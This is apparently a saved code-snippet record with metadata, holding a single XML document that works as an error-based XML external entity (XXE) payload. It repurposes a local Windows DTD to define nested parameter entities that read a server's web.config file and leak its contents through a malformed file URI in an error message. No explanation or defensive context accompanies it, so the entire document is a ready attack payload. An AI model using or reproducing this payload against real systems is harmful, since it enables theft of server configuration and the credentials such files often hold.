---
id: 894d1cb0-414f-42f6-89b7-69250f864085
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.706220+00:00'
updated_at: '2023-04-10T20:24:46.587491+00:00'
---

# Code Snippet 894d1cb0

**Language**: xml

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```


